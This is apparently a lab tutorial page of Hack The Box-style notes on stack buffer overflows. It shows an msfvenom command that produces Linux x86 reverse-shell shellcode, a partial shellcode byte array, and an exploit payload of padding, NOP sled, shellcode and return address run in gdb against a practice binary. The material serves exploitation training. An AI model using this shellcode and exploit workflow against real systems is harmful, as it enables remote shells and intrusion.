# Generating Shellcode

***

We already got to know the tool `msfvenom` with which we generated our shellcode's approximate length. Now we can use this tool again to generate the actual shellcode, which makes the CPU of our target system execute the command we want to have.

But before we generate our shellcode, we have to make sure that the individual components and properties match the target system. Therefore we have to pay attention to the following areas:

* `Architecture`
* `Platform`
* `Bad Characters`

<mark style="color:green;">**MSFvenom Syntax**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```
{% endcode %}

<mark style="color:green;">**MSFvenom - Generate Shellcode**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

```
{% endcode %}

<mark style="color:green;">**Shellcode**</mark>

```shell-session
mrroboteLiot_1@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```

Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.

**Notes**

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

<mark style="color:green;">**Exploit with Shellcode**</mark>

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, we check if the first bytes of our shellcode match the bytes after the NOPS.

<mark style="color:green;">**The Stack**</mark>

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```
